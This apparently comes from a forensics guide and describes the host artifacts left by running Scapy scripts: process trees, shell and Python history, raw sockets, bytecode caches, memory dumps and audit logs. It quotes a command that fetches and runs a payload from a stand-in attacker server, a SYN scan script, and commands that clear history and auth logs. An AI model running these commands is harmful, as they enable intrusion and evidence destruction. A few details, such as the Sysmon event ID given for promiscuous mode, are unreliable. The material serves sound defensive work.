# 03 - Source Evidence

**Key principle:** Scapy is a library embedded in Python scripts, not a standalone binary. The source-host evidence focuses on the Python process itself, the script source code, and network socket activity — there are no Scapy-specific persistent artifacts unless the script itself writes output files.

## Process Execution

### Command-Line Signature

**Interactive shell:**
```
sudo python -m scapy.main
sudo python3 -c "from scapy.all import *; ..."
```

**Script-based:**
```
python3 /path/to/script.py
python3 -c "exec(open('/path/to/script.py').read())"
```

**In an operator workflow:**
```bash
# Most common: run a custom-written .py script
$ python3 -c "from scapy.all import *; pkt = IP(dst='target')/TCP(); send(pkt)"

# Or from a staged script:
$ python3 /tmp/recon.py
```

**Forensic angle:** The Python invocation itself is the primary signal, not Scapy's own process name. Scapy runs entirely within the Python interpreter's process space.

### Process Tree

```
bash (operator shell)
  └─ python3 (or: python)
      ├─ python -m scapy.main (interactive shell), or
      ├─ python script.py (script execution)
      └─ [subprocess children if script spawns them for auxiliary tasks]
```

**No separate Scapy process:** Unlike CLI tools (nmap, masscan, etc.), Scapy is a library that runs synchronously within the parent Python process. There's no `scapy.exe`, `scapy`, or background daemon.

### Parent-Child Relationships

If the operator's script spawns child processes (common for scanning + enumeration chains), the parent is always `python`:

```
python3 recon.py (parent)
  └─ /bin/bash (if script uses subprocess.call)
  └─ /usr/bin/dig (if script calls external DNS tool)
  └─ /usr/bin/curl (if script fetches external data)
```

### Privilege Level

- **Unprivileged usage (layer 7 only):** User-level privileges sufficient for TCP/UDP over established connections.
- **Raw socket usage (layers 2–3):** Requires `root` (Linux/BSD/macOS), Administrator (Windows), or Linux `CAP_NET_RAW` capability.
- **Most common attack usage:** Runs as root because stateless scanning and raw packet sending (layers 2–3) require it.

**Audit trail signal:** `sudo python3 script.py` appears in shell history with `sudo` prefix; on Linux, may trigger sudo logs in `/var/log/auth.log` or journald.

---

## Script Source Code & Staging

### Script Location

Scripts are typically staged in one of these locations:

- **Operator-written, stored locally:** `/root/recon.py`, `~/scapy_exploit.py`, `/tmp/port_scan.py`
- **Fetched from internet:** `curl -s http://attacker-server/payload.py | python3 -`
- **Embedded inline:** `python3 -c "from scapy.all import *; ..."`
- **In memory only (interactive):** Commands typed into `python -m scapy.main` shell leave no file artifacts unless shell history is preserved

### Artifact Preservation

| Location | Preserved? | Details |
|----------|----------|---------|
| `.py` file on disk | Yes | If script was staged as a file, the entire source code is available for forensics |
| Shell history (`.bash_history`, `.zsh_history`, `.python_history`) | Maybe | Depends on shell history settings; interactive `python3 -c "..."` commands may be logged |
| `/tmp/` staging | No | `/tmp/` is often cleared on reboot; scripts staged there are volatile |
| Memory-only (piped stdin) | No | `curl http://attacker-server/payload.py \| python3` runs entirely in RAM; no file trace after the script completes |
| In-memory Python globals | Temporary | Python's `.pyc` bytecode cache (in `__pycache__/`) may persist after the script runs |

**Example script on disk:**

If an operator stages a Scapy scanning script at `/tmp/syn_scan.py`:

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, sr, conf
conf.verb = 0

target_ip = "192.168.1.100"
ports = [22, 80, 443]

packets = [IP(dst=target_ip) / TCP(dport=port, flags="S") for port in ports]
answered, _ = sr(packets, timeout=2)

for sent, received in answered:
    if received[TCP].flags & 0x12:
        print(f"Port {sent[TCP].dport} is open")
```

**Forensic perspective:** The entire script source is recoverable from the filesystem or memory dump. An analyst can:
- Read the source to understand the operator's intent (scanning, fuzzing, exploitation)
- Identify target IPs hardcoded in the script
- Trace the logic to understand the attack workflow

### Bytecode Cache

Python caches compiled bytecode in `__pycache__/` directories:

```
/path/to/__pycache__/
  └─ script.cpython-39.pyc
```

The `.pyc` file contains the compiled bytecode of the script and persists on disk even after the script runs. Tools like `uncompyle6` can decompile `.pyc` files back to source.

**Timeline angle:** The `.pyc` modification timestamp indicates when the script was last executed.

---

## Network Socket Activity

### Raw Socket Creation

When a Scapy script sends raw packets (layers 2–3), it opens a raw socket:

**Linux/BSD:**
```
SOCK_RAW (socket type 4)
Protocol: IPPROTO_RAW (255) or IPPROTO_ICMP (1), etc.
```

**Windows:**
```
WSASocket with WSA_FLAG_OVERLAPPED
Overlapped I/O on raw sockets
```

**macOS:**
```
Similar to BSD; requires `CAP_NET_RAW` or root
```

### Artifact: Network Connections (netstat / ss)

While a Scapy script is running, `netstat -an` or `ss -an` output shows raw socket activity:

**Linux (before/after):**

Before running script:
```
$ ss -an | grep raw
(empty)
```

During script execution:
```
$ ss -an | grep raw
raw UNCONN 0 0 0.0.0.0:* ← raw socket for IPPROTO_RAW
```

After script exits:
```
$ ss -an | grep raw
(empty) ← raw socket is closed
```

**Windows (Process Explorer / netstat):**

A running `python.exe` process will show:
- UDP sockets (if sending at layer 4)
- Raw IP sockets (if sending at layer 3)

**DFIR perspective:** Raw socket activity is the single strongest behavioral signal. Interactive tools like `nmap` -sS also use raw sockets, but the combination of raw sockets + Python process is more specific to Scapy or custom Python network tools.

### Artifact: Network Interfaces (tcpdump / Wireshark on source)

If the operator is capturing traffic with Scapy's `sniff()` function on the same host:

```python
packets = sniff(filter="tcp port 80", count=100)
```

This places the network interface in promiscuous mode:

**Before:**
```
$ ifconfig eth0
eth0 ... BROADCAST RUNNING ...
```

**During (with promiscuous mode):**
```
$ ifconfig eth0
eth0 ... BROADCAST RUNNING PROMISC ...
```

**Detection:** Monitor for interface mode changes via `ip link show` or Sysmon Event ID 17 (PipeEvent created).

---

## Shell History and Command Logs

### .bash_history / .zsh_history

If the operator typed Scapy commands interactively:

```bash
python3
>>> from scapy.all import *
>>> pkt = IP(dst="target")/TCP()
>>> send(pkt)
```

**Forensic artifact:**

```bash
$ cat ~/.bash_history | grep -i scapy
python3 -c "from scapy.all import *; pkt = IP(dst='192.168.1.100')/TCP(dport=80); sr1(pkt)"

$ cat ~/.zsh_history
: 1627503234:0;python3 -c "from scapy.all import *; pkt = IP(dst='192.168.1.100')/TCP(dport=80); sr1(pkt)"
```

**Volatility:** Shell history is written to disk when the shell exits. If the operator's session is still open, history is in-memory only. An operator aware of forensics may:
- `history -c` to clear the history buffer before exiting
- `unset HISTFILE` to disable history logging
- Use `python3 -c "..."` inline commands instead of interactive mode

### Python Interactive History

The Python interactive shell maintains `.python_history` (Python 3.4+):

```
$ cat ~/.python_history
from scapy.all import *
pkt = IP(dst="target")/TCP()
send(pkt)
```

**Similar persistence/erasure concerns as bash history.**

### Syslog / journald (Linux)

If the operator used `sudo`, sudo logs to `/var/log/auth.log` or systemd journald:

```
$ grep sudo /var/log/auth.log | grep python
Sep 11 15:23:45 attacker sudo: user : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/python3 /tmp/scan.py
```

Or via journald:
```
$ journalctl -e | grep sudo | grep python
```

---

## Memory Forensics

### Live Memory Artifacts

While a Scapy script is running, the Python interpreter's memory contains:

1. **Script source code** (as a string object in the interpreter)
2. **Packet objects** (constructed packets in memory, awaiting transmission)
3. **Response packets** (if `sr()` is used, received packets are stored in a `SndRcvList` object)
4. **Target information** (hardcoded IPs, domains, port numbers from the script)

**Recovery via memory dump:**

```bash
# Take a memory dump of a running python3 process
gdb -p <pid> -batch -ex "dump memory /tmp/python_dump.bin 0x<start> 0x<end>"

# Or use volatility (for full system memory):
volatility -f memory.img pslist | grep python
volatility -f memory.img memdump -p <python_pid> -D /tmp/
```

**Analysis:** Strings extracted from the memory dump reveal:
- Scapy imports (`from scapy.all import`)
- Hardcoded target IPs/domains
- Payload data
- Response packets dissected into layer objects

### Garbage Collection Artifacts

Python uses garbage collection. Freed objects may linger in memory until the garbage collector runs. This extends the time window for memory recovery of old packet objects or script code.

---

## Filesystem Artifacts

### Temporary Files (if script writes output)

If the Scapy script writes its results to a file:

```python
from scapy.all import *
packets = sniff(count=100)
wrpcap("/tmp/capture.pcap", packets)  # Write packets to a PCAP file
```

**Forensic artifacts:**

- `/tmp/capture.pcap` — contains all captured packets in pcap format; easily read by Wireshark, tcpdump, or Scapy itself
- File timestamps: creation, modification, access times reveal when the script ran
- File permissions: if world-readable, indicates potential data exfil staging

### Cache & Bytecode

Python's `__pycache__/` directory:

```
$ find /tmp -name "__pycache__" -type d
/tmp/__pycache__/

$ ls -la /tmp/__pycache__/
-rw-r--r-- 1 root root 2048 Sep 11 15:30 recon.cpython-39.pyc
```

**Forensic value:** The `.pyc` bytecode is recoverable and can be decompiled to source (via `uncompyle6` or similar).

### Python Installation Artifacts

Python's site-packages directory may contain Scapy if installed with `pip`:

```
$ pip show scapy
Name: scapy
Version: 2.5.0
Location: /usr/local/lib/python3.9/site-packages
```

**Forensic angle:** The presence of Scapy in `site-packages` indicates the tool was installed on the host. An operator could also use a portable/vendored version of Scapy (copying the `scapy/` library folder into the script directory), which avoids installation artifacts.

---

## Linux Process Auditing (auditd)

If the host has Linux audit enabled, every `sudo` command and raw socket call can be logged:

```
$ grep python /var/log/audit/audit.log
type=EXECVE msg=audit(...): argc=2 a0="/usr/bin/python3" a1="/tmp/scan.py"
type=PROCTITLE msg=audit(...): proctitle=python3 /tmp/scan.py
type=SOCKETCALL msg=audit(...): sockcall=socket
```

**Audit fields of interest:**
- `type=EXECVE` — Python interpreter invocation
- `type=SOCKETCALL` — raw socket creation
- `type=CONNECT` — outbound connections from the Python process
- `type=PROCTITLE` — full command-line arguments

---

## Windows Process Auditing

### Event Log: Process Creation (Event ID 4688)

On Windows with command-line auditing enabled (`AuditProcessCreation`), every Python invocation is logged:

```
Event ID: 4688
Creator Process: cmd.exe
Process Name: C:\Python39\python.exe
Command Line: python.exe -c "from scapy.all import *; ..."
```

### Raw Socket Creation (WMI / ETW)

Windows Event Tracing for Windows (ETW) can log raw socket operations via the `Microsoft-Windows-NDIS-PacketCapture` provider.

### Network Capture (Network Monitor / Wireshark on source)

On Windows, a running Scapy script can be monitored via:
- **netsh trace** to capture live network traffic
- **Wireshark** running locally on the attacker host

---

## Timeline Correlation (Source → Target)

**Critical for attribution:** The source-host artifacts must be correlated with target-side evidence to establish:
1. **When** the attack occurred (process execution timestamp)
2. **What** was targeted (hardcoded IPs/domains in script or memory)
3. **How** the attack was launched (network socket, raw packets, protocol used)

### Example Timeline

**Source host:**
- 15:23:45 — `sudo python3 /tmp/scan.py` (command history, audit log)
- 15:23:45 — Process created: `python3` (Event 4688 on Windows, auditd on Linux)
- 15:23:45–15:23:50 — Raw sockets active, packets sent (netstat/ss, auditd)
- 15:23:50 — Script completes; Python process exits

**Target host (e.g., web server):**
- 15:23:45 — Unusual inbound traffic: TCP SYN packets on multiple ports
- 15:23:45 — Firewall logs: "Inbound connection attempt port 22, 80, 443"
- 15:23:46 — Web server logs: Multiple probes for common ports (if running)
- 15:23:50 — Traffic ceases

**Analyst correlation:**
- Source-host script execution time matches target-host traffic start time
- Hardcoded IPs in source script match target-host attack IP
- Packet structure (TTL, flags, payload) in target-host network capture matches Scapy construction code in source script

---

## Evasion & Anti-Forensics (Operator Tactics)

### Script Cleanup

```bash
# Operator clears shell history
history -c
rm -f ~/.bash_history ~/.python_history

# Operator removes script from disk
rm -f /tmp/scan.py /tmp/*.pcap

# Operator clears sudo logs (requires additional privesc)
echo "" > /var/log/auth.log
```

**But:** The attack still leaves:
- Network socket artifacts (ephemeral, but logged in real-time monitoring)
- Memory artifacts (recoverable from memory dump if captured during or shortly after execution)
- Target-side evidence (the main signal; source-host evidence is supplementary)
- Audit trail (auditd logs are typically write-protected and difficult to alter without additional privesc)

### Inline Execution (No File Staging)

```bash
python3 -c "from scapy.all import *; pkt = IP(dst='target')/TCP(); send(pkt)"

# Even more evasive:
curl -s http://attacker-server/payload.py | python3 -
```

**Forensic impact:**
- No script file on disk
- But: Shell history may still log the `-c` command
- Curl history (`.bash_history`) reveals the download source (attribution)
- Network connection to attacker-server is logged on the source host

---

## Summary: Source Evidence Strength Ranking

| Artifact | Persistence | Volatility | Strength | Notes |
|----------|-------------|-----------|----------|-------|
| Python process (during execution) | Temporary | Very high | High | Best during live response; gone after script exits |
| Raw socket activity | Temporary | Very high | High | Visible only while script runs; requires real-time monitoring |
| Script file on disk | Persistent | Low | Very High | Remains for analysis after script execution; gold standard |
| Shell history | Persistent | Medium | High | Operator may clear it; often forgotten |
| Python memory dump | Temporary | Very high | High | Requires memory forensics; recovers script, targets, packets |
| Bytecode cache (.pyc) | Persistent | Low | Medium | Decompilable; reveals script logic and timing |
| Audit logs (auditd/Event 4688) | Persistent | Low | Very High | Difficult to alter; shows execution time and user |
| Network capture (pcap) | Depends on operator | Low–High | Very High | Captures the actual packets sent/received |
| Temporary file artifacts (/tmp) | Volatile | High | Medium | Operator often forgets to clean up; rebootable systems clear it |

**Practical takeaway:** **Never rely on source-host evidence alone.** The target-side evidence (network packets, service logs, system-level artifacts) is the stronger signal. Source evidence is best used to corroborate and attribute an attack when both source and target artifacts are available.
